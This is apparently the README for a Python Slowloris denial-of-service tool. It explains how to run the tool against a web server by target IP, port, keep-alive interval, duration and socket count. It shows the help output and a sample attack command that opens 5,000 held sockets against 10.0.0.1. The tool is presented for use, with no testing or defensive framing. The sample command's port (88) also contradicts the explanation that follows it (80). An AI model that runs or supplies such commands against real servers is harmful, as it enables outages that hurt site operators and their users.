This is a simple slow loris attack made in python

use:
python3 slowloris.py ... some parameter.

run python3 slowloris.py -h to see the options

example:
python3 slowloris.py -h

output:
options:
  -h, --help            show this help message and exit
  -t, --target TARGET   Target IP of the webserver
  -p, --port PORT       port which web server is running (default 80)
  -i, --interval INTERVAL
                        Interval on keep-alive headers (seconds) (default 1)
  -d, --duration DURATION
                        How long the attack will run (seconds) (default 1 million)
  -s, --socketCount SOCKETCOUNT
                        How many socket to create (default 1 million)


running:
python3 slowloris.py -p 88 -t 10.0.0.1 -d 1000 -s 5000 -i 1

This targets the (-t) 10.0.0.1 on port (-p) 80 creating (-s) 5000 sockets connection in the web server... which every (-i)
1 seconds, the script will send a fake initial HTTP request in the server and the script will also hold the entire socket for (-d) 1000 seconds.
